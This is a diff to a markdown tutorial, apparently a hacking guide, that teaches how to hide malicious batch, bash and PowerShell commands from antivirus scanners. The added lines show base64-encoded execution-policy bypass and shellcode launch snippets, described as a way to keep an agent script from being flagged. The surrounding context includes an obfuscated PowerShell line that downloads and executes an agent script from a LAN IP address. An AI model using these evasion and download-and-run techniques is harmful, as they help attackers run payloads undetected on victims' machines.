@@ -128,12 +128,19 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
 ---
 
-       use base64 to decode the encoded syscall :) [base64 decoded:-Exec Bypass]
+      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
+      the agent.bat dosen't contain any real malicious syscall's to be scan/flagged. 
 
-       [using powershell inside batch interpreter]
+
+- String command to obfuscate<br />
+`-Exec Bypass`
+
+       [use base64 to decode the encoded syscall]
        set "base64string=LUV4ZWMgQnlwYXNzCg=="
        for /f "tokens=* delims=" %%# in ('powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""%base64string%"""^)^)') do set "decoded=%%#"
-        cmd.exe /c powershell.exe -nop %decoded% -noni -enc $shellcode <-- here is our base64 syscall decoded
+        cmd.exe /c powershell.exe -nop %decoded% -noni -enc $shellcode #<-- execute/decode the base64 syscall at runtime
+
+![batch obfuscation](http://i.)
 
 [0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
 
@@ -256,7 +263,7 @@ The above string can be obfuscated using **bash special characters: '** or **\\*
 
       3º - Insert the follow lines into your bash script
       string=`echo "cm91dGUgLW4K" | base64 -d`
-      $string   <-- execute/decode the base64 string (syscall) at runtime
+      $string   #<-- execute/decode the base64 syscall at runtime
 
 ![bash obfuscation](http://i.cubeupload.com/gXKy3s.png)
 
@@ -326,8 +333,8 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 ---
 
       [RTLO] Powershell cames with one buitin feature (::Reverse) that allow us to change the
-      text alignment from left to rigth side (arabe alignment). That allow us to use it as
-      one obfuscation technic (writing syscall's backwards) and 'revert' them at runtime.
+      text alignment from left to rigth side (arabe alignment). That built-in feature allow us
+      to use it as obfuscation technic (writing syscall's backwards) and 'revert' them at runtime.
 
 ![powershell obfuscation](http://i.cubeupload.com/yukEB8.jpg)
 
@@ -355,6 +362,24 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
       I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.71/Ag`En`T.ps`1")' -f'Ne','Downnload','http://','lie') | I`EX
 
 ![powershell obfuscation](http://i.cubeupload.com/RG5OKP.jpg)
+
+---
+
+      Using base64 stings decoded at runtime are a Useful obfuscation trick, because
+      the agent.ps1 dosen't contain any real malicious syscall's to be scan/flagged. 
+
+
+- String command to obfuscate<br />
+`Get-date`
+
+       [using powershell to decode base64 syscall]
+       $base64string=R2V0LURhdGUK
+       $decoded = 'powershell [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("""$base64string"""^)^)'
+       powershell.exe $decoded   #<-- execute/decode the base64 syscall at runtime
+
+![powershell obfuscation](http://i.)
+
+---
 
 [!] [All Hail to ''@danielbohannon'' for its extraordinary work (obfuscation) under powershell](https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf)<br />
 [0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
